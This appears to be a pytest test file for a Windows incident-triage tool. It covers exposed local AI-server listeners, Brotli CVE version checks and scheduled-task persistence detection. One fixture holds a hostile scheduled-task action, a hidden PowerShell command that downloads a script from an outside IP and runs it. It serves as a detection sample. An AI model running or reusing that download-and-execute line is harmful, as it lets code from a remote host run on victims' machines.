"""Regression tests for tools/black_october_triage.py (Black October IoC checks).

Focus on the pure helpers: a broken classifier would either hide an exposed
local LLM endpoint (the Black October AI-server leg) or spam false positives.
"""

import pathlib
import sys

import pytest

_TOOL = (
    pathlib.Path(__file__).resolve().parents[1] / "tools" / "black_october_triage.py"
)


def _load():
    import importlib.util

    spec = importlib.util.spec_from_file_location("black_october_triage", _TOOL)
    assert spec and spec.loader
    mod = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = mod
    spec.loader.exec_module(mod)
    return mod


bot = _load()


def test_tool_module_is_importable():
    assert hasattr(bot, "main")
    assert hasattr(bot, "check_listening_sockets")


def test_parse_listener_entries_reads_addr_port_process():
    text = "0.0.0.0:1234|lmstudio\n127.0.0.1:8080|python\n"
    assert bot._parse_listener_entries(text) == [
        ("0.0.0.0", "1234", "lmstudio"),
        ("127.0.0.1", "8080", "python"),
    ]


def test_parse_listener_entries_tolerates_missing_process_column():
    assert bot._parse_listener_entries("192.168.1.5:445\n") == [
        ("192.168.1.5", "445", "")
    ]


def test_parse_listener_entries_skips_junk_lines():
    text = "Active Connections\n  Proto  Local Address\nnot-a-socket\n127.0.0.1:1|x"
    assert bot._parse_listener_entries(text) == [("127.0.0.1", "1", "x")]


def test_parse_listener_entries_strips_ipv6_brackets():
    assert bot._parse_listener_entries("[::1]:5939|node") == [("::1", "5939", "node")]


NETSTAT_SAMPLE = """
Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       2700
  TCP    0.0.0.0:61236          0.0.0.0:0              LISTENING       20444
  TCP    192.168.1.173:139      0.0.0.0:0              LISTENING       4
  TCP    127.0.0.1:9000         0.0.0.0:0              LISTENING       111
  TCP    10.0.0.5:50000         10.0.0.9:443           ESTABLISHED     999
"""


def test_parse_listener_entries_reads_netstat_rows():
    entries = bot._parse_listener_entries(NETSTAT_SAMPLE)
    assert ("0.0.0.0", "135", "") in entries
    assert ("192.168.1.173", "139", "") in entries
    assert ("127.0.0.1", "9000", "") in entries


def test_parse_listener_entries_ignores_established_connections():
    ports = [port for _addr, port, _proc in bot._parse_listener_entries(NETSTAT_SAMPLE)]
    assert "50000" not in ports


def test_pid_name_map_parses_tasklist_csv(monkeypatch):
    csv = (
        '"lmlink-connector.exe","20444","Console","1","51.744 K"\n'
        '"svchost.exe","2700","Services","0","8 K"\n'
    )
    monkeypatch.setattr(bot, "sh", lambda _cmd: csv)
    assert bot._pid_name_map() == {
        "20444": "lmlink-connector.exe",
        "2700": "svchost.exe",
    }


def test_lmlink_connector_counts_as_lmstudio_ai_process():
    buckets = bot._classify_listeners([("0.0.0.0", "61236", "lmlink-connector.exe")])
    assert buckets["ai_exposed"] == ["0.0.0.0:61236 (lmlink-connector.exe)"]


def test_classify_ignores_loopback():
    buckets = bot._classify_listeners(
        [("127.0.0.1", "1234", "lmstudio"), ("::1", "1234", "ollama")]
    )
    assert buckets == {"wildcard": [], "nonloopback": [], "ai_exposed": []}


def test_classify_flags_exposed_ai_process_as_its_own_bucket():
    buckets = bot._classify_listeners(
        [
            ("0.0.0.0", "1234", "lmstudio"),
            ("192.168.1.173", "11434", "ollama"),
            ("0.0.0.0", "445", "system"),
        ]
    )
    assert sorted(buckets["ai_exposed"]) == [
        "0.0.0.0:1234 (lmstudio)",
        "192.168.1.173:11434 (ollama)",
    ]
    assert buckets["wildcard"] == ["0.0.0.0:1234 (lmstudio)", "0.0.0.0:445 (system)"]
    assert buckets["nonloopback"] == ["192.168.1.173:11434 (ollama)"]


def test_classify_does_not_treat_lan_service_as_ai():
    buckets = bot._classify_listeners([("192.168.1.173", "445", "system")])
    assert buckets["ai_exposed"] == []
    assert buckets["nonloopback"] == ["192.168.1.173:445 (system)"]


def test_check_listening_sockets_flags_exposed_ai(monkeypatch):
    monkeypatch.setattr(
        bot, "_listener_scan", lambda: "0.0.0.0:1234|lmstudio\n127.0.0.1:9|x\n"
    )
    monkeypatch.setattr(bot, "FINDINGS", [])
    bot.check_listening_sockets()
    names = [name for _sev, name, _detail in bot.FINDINGS]
    assert "ai-server-exposed" in names
    assert all(name != "listener-nonloopback" for name in names)


def test_check_listening_sockets_quiet_when_loopback_only(monkeypatch):
    monkeypatch.setattr(bot, "_listener_scan", lambda: "127.0.0.1:1234|lmstudio\n")
    monkeypatch.setattr(bot, "FINDINGS", [])
    bot.check_listening_sockets()
    assert bot.FINDINGS == []


def test_check_listening_sockets_ignores_os_owned_wildcard(monkeypatch):
    """Windows' own services listen on 0.0.0.0 by default - that is not a finding."""
    monkeypatch.setattr(
        bot, "_listener_scan",
        lambda: (
            "0.0.0.0:135|svchost.exe\n"
            "0.0.0.0:445|system\n"
            "0.0.0.0:49664|lsass.exe\n"
        ),
    )
    monkeypatch.setattr(bot, "FINDINGS", [])
    bot.check_listening_sockets()
    assert bot.FINDINGS == []


def test_check_listening_sockets_flags_third_party_wildcard(monkeypatch):
    monkeypatch.setattr(bot, "_listener_scan", lambda: "0.0.0.0:5000|python.exe\n")
    monkeypatch.setattr(bot, "FINDINGS", [])
    bot.check_listening_sockets()
    flags = {name: detail for _sev, name, detail in bot.FINDINGS}
    assert "listener-wildcard" in flags
    assert "0.0.0.0:5000 (python.exe)" in flags["listener-wildcard"]


@pytest.mark.parametrize(
    "version,patched",
    [("v24.22.1", True), ("v24.15.0", False), ("v22.23.4", True),
     ("v26.12.1", True), ("v25.5.0", False), ("v24.23.0", True)],
)
def test_node_patch_gate_against_node2shell(version, patched):
    ok, _note = bot._node_is_patched(version)
    assert ok is patched


def test_node_gate_rejects_unparseable_version():
    ok, note = bot._node_is_patched("vNaN")
    assert ok is False
    assert "unparseable" in note


# --- CVE-2026-111497 is a BROTLI decoder bug, not a "Node2Shell" -----------
#
# NVD + Node's own advisory: buffer overflow in the Brotli decoder, affected
# Brotli 1.0.3 through 1.2.0, fixed in 1.0.10 / 1.1.1 / 1.2.1.  Node inherits it
# by bundling Brotli.  Scanning used to report purely on the Node version and call
# it "Node2Shell", which both misnamed the defect and could miss a backport.
#
# Observed on the scan host: node 24.15.0 and node 25.5.0 BOTH bundle brotli
# 1.2.0.  The affected version, not the runtime, decides the risk.
@pytest.mark.parametrize(
    "version,patched",
    [
        ("1.2.0", False),   # observed in every Node binary on the host
        ("1.1.0", False),
        ("1.0.3", False),   # first affected release
        ("1.0.9", False),
        ("1.2.1", True),    # first fixed release in the 1.2 line
        ("1.1.1", True),
        ("1.0.10", True),
        ("1.3.0", True),
        ("1.0.2", True),    # predates the affected range
    ],
)
def test_brotli_gate_matches_nvd_affected_range(version, patched):
    ok, note = bot._brotli_is_patched(version)
    assert ok is patched, note


def test_brotli_gate_rejects_unparseable_version():
    ok, note = bot._brotli_is_patched("not-a-version")
    assert ok is False
    assert "unparseable" in note


def test_brotli_gate_names_the_real_cve_when_vulnerable():
    ok, note = bot._brotli_is_patched("1.2.0")
    assert ok is False
    assert "CVE-2026-111497" in note
    assert "1.2.1" in note


def test_brotli_evidence_is_silent_when_version_unreadable(monkeypatch):
    """A sandbox that cannot run node must not invent a Brotli verdict."""
    monkeypatch.setattr(bot, "sh", lambda _cmd: "")
    assert bot._brotli_evidence("node") == ""


def test_brotli_evidence_reports_vulnerable_bundle(monkeypatch):
    monkeypatch.setattr(bot, "sh", lambda _cmd: "1.2.0\n")
    ev = bot._brotli_evidence("node")
    assert "CVE-2026-111497" in ev


def test_brotli_evidence_rejects_node_version_as_brotli(monkeypatch):
    """A Node version string must never be accepted as a Brotli version.

    Node is on major 22/24/25/26; Brotli is on major 0/1.  Accepting 'v24.15.0'
    here produced the nonsense verdict 'brotli 24.15.0 is newer than the
    affected range' during development.
    """
    monkeypatch.setattr(bot, "sh", lambda _cmd: "v24.15.0\n")
    assert bot._brotli_evidence("node") == ""


# --- standalone brotli.exe copies shipped by other apps -------------------
#
# Git for Windows ships brotli 1.2.0 and the ComfyUI bundle ships 1.1.0 on the
# scan host; both are inside the affected range, and 1.1.0 needs 1.1.1 rather
# than 1.2.1.  The mingw libbrotlidec.dll copies carry no version resource, so
# the CLI is the only reliable probe.


def test_native_brotli_flags_vulnerable_cli(monkeypatch, tmp_path):
    exe = tmp_path / "brotli.exe"
    exe.write_bytes(b"")
    monkeypatch.setattr(bot, "FINDINGS", [])
    monkeypatch.setattr(bot, "_brotli_cli_paths", lambda: [exe])
    monkeypatch.setattr(bot, "sh", lambda _cmd: "brotli 1.2.0\n")
    bot.check_native_brotli()
    names = {name for _sev, name, _detail in bot.FINDINGS}
    assert names == {"brotli-cli-vulnerable"}


def test_native_brotli_accepts_fixed_cli(monkeypatch, tmp_path):
    exe = tmp_path / "brotli.exe"
    exe.write_bytes(b"")
    monkeypatch.setattr(bot, "FINDINGS", [])
    monkeypatch.setattr(bot, "_brotli_cli_paths", lambda: [exe])
    monkeypatch.setattr(bot, "sh", lambda _cmd: "brotli 1.2.1\n")
    bot.check_native_brotli()
    assert bot.FINDINGS == []


def test_native_brotli_parses_thirteen_version_as_fixed(monkeypatch, tmp_path):
    """brotli 1.3.0 is past the affected range - must not be a finding."""
    exe = tmp_path / "brotli.exe"
    exe.write_bytes(b"")
    monkeypatch.setattr(bot, "FINDINGS", [])
    monkeypatch.setattr(bot, "_brotli_cli_paths", lambda: [exe])
    monkeypatch.setattr(bot, "sh", lambda _cmd: "brotli 1.3.0\n")
    bot.check_native_brotli()
    assert bot.FINDINGS == []


def test_native_brotli_reports_unreadable_version_rather_than_guessing(
    monkeypatch, tmp_path
):
    """A sandbox that blocks the probe must say 'unreadable', not invent a verdict."""
    exe = tmp_path / "brotli.exe"
    exe.write_bytes(b"")
    monkeypatch.setattr(bot, "FINDINGS", [])
    monkeypatch.setattr(bot, "_brotli_cli_paths", lambda: [exe])
    monkeypatch.setattr(bot, "sh", lambda _cmd: "Access is denied.\n")
    bot.check_native_brotli()
    names = {name for _sev, name, _detail in bot.FINDINGS}
    assert names == {"brotli-cli-unreadable"}


def test_native_brotli_is_quiet_when_no_cli_present(monkeypatch):
    monkeypatch.setattr(bot, "FINDINGS", [])
    monkeypatch.setattr(bot, "_brotli_cli_paths", lambda: [])
    bot.check_native_brotli()
    assert bot.FINDINGS == []


def test_node_findings_do_not_claim_nonexistent_node2shell(monkeypatch):
    """The misnamed 'node2shell' finding ids must not come back."""
    monkeypatch.setattr(bot, "FINDINGS", [])

    def fake_sh(cmd):
        # php must look genuinely absent, or it masks the node assertion
        if cmd.startswith("php"):
            return "'php' is not recognized as an internal or external command"
        if cmd.startswith("certutil"):
            return ""
        return "v24.15.0"

    monkeypatch.setattr(bot, "sh", fake_sh)
    monkeypatch.setattr(bot, "_bundled_node", lambda: [])
    bot.check_runtimes()
    names = {name for _sev, name, _detail in bot.FINDINGS}
    assert names == {"node-brotli"}


def test_java_finding_cites_no_unpublished_cve(monkeypatch):
    """CVE-2026-22020 returns 0 NVD records, so it must not be presented as fact."""
    monkeypatch.setattr(bot, "FINDINGS", [])
    monkeypatch.setattr(bot, "sh", lambda cmd: 'java version "1.8.0_491"')
    bot.check_ai_runtimes()
    details = " ".join(d for _s, n, d in bot.FINDINGS if n == "java-present")
    assert "CVE-2026-22020" not in details


def test_main_returns_finding_count(monkeypatch):
    monkeypatch.setattr(bot, "FINDINGS", [])
    for fn in (
        "check_startup_hooks", "check_litellm", "check_run_keys",
        "check_startup_folders", "check_scheduled_tasks", "check_runtimes",
        "check_python_brotli", "check_native_brotli", "check_wallets",
        "check_ca_trust", "check_ai_runtimes", "check_listening_sockets",
    ):
        monkeypatch.setattr(bot, fn, lambda: None)
    assert bot.main() == 0


# --- scheduled-task persistence check -------------------------------------
#
# The original implementation substring-matched "helper"/"sync"/"updater" across
# the whole CSV row and reported 37 healthy vendor tasks; a naive LOLBin rule
# then reported ~20 of Windows' own rundll32 maintenance tasks and labelled
# Defender's platform binaries CRITICAL.  These tests pin the shape that must
# stay silent and the shape that must not.

SCHTASKS_SAMPLE = (
    '"PC","\\OneDrive Reporting Task","N/A","Ready","Interactive only",'
    '"26-10-2026 14:06:16","0","Microsoft Corporation",'
    '"%localappdata%\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe /reporting",'
    '"N/A","N/A","Enabled","Disabled","Stop On Battery Mode","Holger","Disabled",'
    '"02:00:00","N/A","One Time Only","14:06:15","23-10-2026","N/A","N/A","N/A",'
    '"24 Hour(s)","None","Disabled","Disabled"\n'
    '"PC","\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup",'
    '"N/A","Ready","Interactive only","26-10-2026 09:39:24","0",'
    '"Microsoft Corporation",'
    '"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.26090.9-0\\'
    'MpCmdRun.exe -IdleTask -TaskName WdCleanup","N/A","N/A","Enabled","Disabled",'
    '"","Holger","Disabled","Disabled","N/A","On demand only","N/A","N/A","N/A",'
    '"N/A","N/A","N/A","N/A","N/A","N/A","N/A"\n'
    '"PC","\\Microsoft\\Windows\\Application Experience\\PcaPatchDbTask","N/A",'
    '"Ready","Interactive only","26-10-2026 09:39:24","0","Microsoft Corporation",'
    '"%windir%\\system32\\rundll32.exe %windir%\\system32\\PcaSvc.dll,'
    'PcaPatchSdbTask","N/A","N/A","Enabled","Disabled","","Holger","Disabled",'
    '"Disabled","N/A","On demand only","N/A","N/A","N/A","N/A","N/A","N/A","N/A",'
    '"N/A","N/A","N/A"\n'
)

MALICIOUS_TASK = (
    '"PC","\\SystemUpdate","N/A","Ready","Interactive only",'
    '"26-10-2026 09:39:24","0","DESKTOP\\Holger",'
    '"C:\\Users\\Holger\\AppData\\Roaming\\svc\\update.ps1" powershell -w hidden '
    '-enc SQBFAFgA -Command "iwr http://198.51.100.7/a.ps1|iex",'
    '"N/A","N/A","Enabled","Disabled","","Holger","Disabled","Disabled","N/A",'
    '"On demand only","N/A","N/A","N/A","N/A","N/A","N/A","N/A","N/A","N/A","N/A"\n'
)


def test_parse_schtasks_verbose_maps_name_author_and_action():
    tasks = bot._parse_schtasks_verbose(SCHTASKS_SAMPLE)
    assert len(tasks) == 3
    assert tasks[0]["name"] == "\\OneDrive Reporting Task"
    assert tasks[0]["author"] == "Microsoft Corporation"
    assert "OneDriveStandaloneUpdater.exe" in tasks[0]["action"]
    assert tasks[2]["action"].startswith("%windir%\\system32\\rundll32.exe")


def test_parse_schtasks_verbose_skips_junk_and_short_rows():
    assert bot._parse_schtasks_verbose('INFO: There are no tasks.\n"a","b"\n') == []


def test_task_risk_silent_for_defender_programdata_task():
    """Defender lives in ProgramData\\Microsoft - not a dropper directory."""
    task = bot._parse_schtasks_verbose(SCHTASKS_SAMPLE)[1]
    assert bot._task_risk(task) is None


def test_task_risk_silent_for_os_rundll32_maintenance_task():
    """rundll32 from %windir% is how Windows schedules its own maintenance."""
    task = bot._parse_schtasks_verbose(SCHTASKS_SAMPLE)[2]
    assert bot._task_risk(task) is None


def test_task_risk_downgrades_vendor_appdata_only_task_to_medium():
    task = bot._parse_schtasks_verbose(SCHTASKS_SAMPLE)[0]
    verdict = bot._task_risk(task)
    assert verdict is not None
    assert verdict[0] == "MEDIUM"


def test_task_risk_flags_dropper_with_encoded_powershell_as_critical():
    task = bot._parse_schtasks_verbose(MALICIOUS_TASK)[0]
    verdict = bot._task_risk(task)
    assert verdict is not None
    severity, reason = verdict
    assert severity == "CRITICAL"
    assert "user-writable" in reason
    assert "powershell" in reason
    assert "http://" in reason


def test_check_scheduled_tasks_reports_only_the_dropper_as_critical(monkeypatch):
    """Vendor task in %localappdata% stays MEDIUM; only the dropper is CRITICAL.

    The OneDrive task is a real (if benign) signal - a known vendor launching
    from a user-writable dir - so suppressing it entirely would hide the exact
    directory a dropper uses.  It must not, however, be ranked with the dropper.
    """
    monkeypatch.setattr(bot, "sh", lambda _cmd: SCHTASKS_SAMPLE + MALICIOUS_TASK)
    monkeypatch.setattr(bot, "FINDINGS", [])
    bot.check_scheduled_tasks()
    critical = [detail for sev, _name, detail in bot.FINDINGS if sev == "CRITICAL"]
    medium = [detail for sev, _name, detail in bot.FINDINGS if sev == "MEDIUM"]
    assert len(critical) == 1
    assert "\\SystemUpdate" in critical[0]
    assert all("\\SystemUpdate" not in detail for detail in medium)


def test_check_scheduled_tasks_is_quiet_on_vendor_only_host(monkeypatch):
    """Regression: the 37-vendor-task false-positive flood."""
    rows = "".join(
        f'"PC","\\\\{vendor} Helper Update Task","N/A","Ready","Interactive only",'
        f'"26-10-2026 09:39:24","0","{vendor}",'
        f'"C:\\\\Program Files\\\\{vendor}\\\\helper.exe /sync",'
        '"N/A","N/A","Enabled","Disabled","","Holger","Disabled","Disabled","N/A",'
        '"On demand only","N/A","N/A","N/A","N/A","N/A","N/A","N/A","N/A",'
        '"N/A","N/A"\n'
        for vendor in ("Google", "Adobe", "Mozilla", "NVIDIA", "Intel", "AMD")
    )
    monkeypatch.setattr(bot, "sh", lambda _cmd: rows)
    monkeypatch.setattr(bot, "FINDINGS", [])
    bot.check_scheduled_tasks()
    assert bot.FINDINGS == []


# --- autostart completeness + blind-scan guard -------------------------------
# Two gaps in the OneDrive removal: the task that restarts the app was invisible,
# and a failed probe reported as clean instead of blind.  Both are pinned here.

def _task_row(name, author, action, state="Enabled", schedule_type="At logon time"):
    """Build a 28-column ``schtasks /fo csv /v`` row in Windows' column order."""
    fields = [
        "PC", name, "N/A", "Ready", "Interactive only", "26-10-2026 09:48:58",
        "0", author, action, "N/A", "N/A", state, "Disabled",
        "Stop On Battery Mode", "Holger", "Disabled", "02:00:00", "N/A",
        schedule_type, "N/A", "N/A", "N/A", "N/A", "N/A", "N/A", "N/A", "N/A",
        "N/A",
    ]
    assert len(fields) == 28
    return '"' + '","'.join(fields) + '"\n'


ONEDRIVE_STARTUP = _task_row(
    "\\OneDrive Startup Task-S-1-5-21-1-2-3-1001",
    "Microsoft Corporation",
    "C:\\Users\\Holger\\AppData\\Local\\Microsoft\\OneDrive\\26.189\\"
    "OneDriveLauncher.exe /startInstances",
)


def test_parse_schtasks_verbose_captures_state_and_schedule_type():
    """Column 11 and 18 decide 'is this enabled' and 'is it a logon trigger'."""
    task = bot._parse_schtasks_verbose(ONEDRIVE_STARTUP)[0]
    assert task["state"] == "Enabled"
    assert task["schedule_type"] == "At logon time"


def test_parse_schtasks_verbose_defaults_trailing_fields_on_nine_column_rows():
    task = bot._parse_schtasks_verbose(
        '"PC","\\n","N/A","Ready","Interactive only","N/A","0","a","b"\n'
    )[0]
    assert task["state"] == ""
    assert task["schedule_type"] == ""


def test_autostart_restart_flags_enabled_onedrive_logon_task():
    """The real finding: a logon task relaunches OneDrive regardless of Run key."""
    task = bot._parse_schtasks_verbose(ONEDRIVE_STARTUP)[0]
    verdict = bot._autostart_restart_risk(task)
    assert verdict is not None
    severity, reason = verdict
    assert severity == "MEDIUM"
    assert "At logon time" in reason
    assert "OneDrive" in reason
    assert "disable the task" in reason


def test_autostart_restart_silent_once_task_is_disabled():
    """Re-reporting a task that has been fixed is noise, not a finding."""
    row = ONEDRIVE_STARTUP.replace('"Enabled"', '"Disabled"', 1)
    task = bot._parse_schtasks_verbose(row)[0]
    assert task["state"] == "Disabled"
    assert bot._autostart_restart_risk(task) is None


def test_autostart_restart_silent_for_non_logon_trigger():
    """The updater does periodic work, not logon launch - must stay silent."""
    task = bot._parse_schtasks_verbose(
        _task_row(
            "\\OneDrive Reporting Task",
            "Microsoft Corporation",
            "%localappdata%\\Microsoft\\OneDrive\\"
            "OneDriveStandaloneUpdater.exe /reporting",
            schedule_type="One Time Only",
        )
    )[0]
    assert bot._autostart_restart_risk(task) is None


def test_autostart_restart_silent_for_unrelated_logon_task():
    task = bot._parse_schtasks_verbose(
        _task_row("\\Acme Prune", "Acme", "C:\\Program Files\\Acme\\prune.exe")
    )[0]
    assert bot._autostart_restart_risk(task) is None


def test_check_scheduled_tasks_reports_enabled_onedrive_logon_task(monkeypatch):
    monkeypatch.setattr(bot, "sh", lambda _cmd: ONEDRIVE_STARTUP)
    monkeypatch.setattr(bot, "FINDINGS", [])
    bot.check_scheduled_tasks()
    names = [name for sev, name, _d in bot.FINDINGS if sev == "MEDIUM"]
    assert "scheduled-task-persistence" in names
    assert "scheduled-task-scan-empty" not in names


def test_check_scheduled_tasks_reports_blind_scan_instead_of_clean(monkeypatch):
    """Regression: an empty parse means the probe failed, not that the box is clean.

    The earlier ``os.walk`` of C:\\Windows\\System32\\Tasks raised Access denied and
    returned 0 hits, which was reported as clean and hid a live logon task.
    """
    monkeypatch.setattr(bot, "sh", lambda _cmd: "")
    monkeypatch.setattr(bot, "FINDINGS", [])
    bot.check_scheduled_tasks()
    assert [n for _s, n, _d in bot.FINDINGS] == ["scheduled-task-scan-empty"]
    severity = bot.FINDINGS[0][0]
    assert severity == "MEDIUM"
    assert "BLIND" in bot.FINDINGS[0][2]


# --- a disabled task must not look like live persistence ---------------------
# After the OneDrive Startup Task was disabled, the scan still reported it at
# MEDIUM, identical to the two enabled updaters.  An applied fix then reads as
# an open finding.  Disabled stays visible but drops to LOW and says why.

def _updater_task(state="Enabled"):
    return bot._parse_schtasks_verbose(
        _task_row(
            "\\OneDrive Standalone Update Task",
            "Microsoft Corporation",
            "%localappdata%\\Microsoft\\OneDrive\\"
            "OneDriveStandaloneUpdater.exe",
            state=state,
        )
    )[0]


def test_task_risk_demotes_disabled_task_to_low():
    severity, reason = bot._task_risk(_updater_task(state="Disabled"))
    assert severity == "LOW"
    assert "Disabled" in reason
    assert "not currently active" in reason


def test_task_risk_keeps_enabled_vendor_task_at_medium():
    """The demotion must not leak into the enabled case."""
    severity, reason = bot._task_risk(_updater_task(state="Enabled"))
    assert severity == "MEDIUM"
    assert "Disabled" not in reason


def test_task_risk_still_reports_critical_for_non_vendor_dropper():
    """A dropper-shaped task with no vendor author stays CRITICAL when enabled."""
    task = bot._parse_schtasks_verbose(
        _task_row(
            "\\SystemUpdate",
            "Unknown",
            "%appdata%\\Temp\\payload.exe -enc aGVsbG8=",
        )
    )[0]
    assert bot._task_risk(task)[0] == "CRITICAL"


def test_task_risk_disabled_dropper_is_low_not_critical():
    task = bot._parse_schtasks_verbose(
        _task_row(
            "\\SystemUpdate",
            "Unknown",
            "%appdata%\\Temp\\payload.exe -enc aGVsbG8=",
            state="Disabled",
        )
    )[0]
    assert bot._task_risk(task)[0] == "LOW"
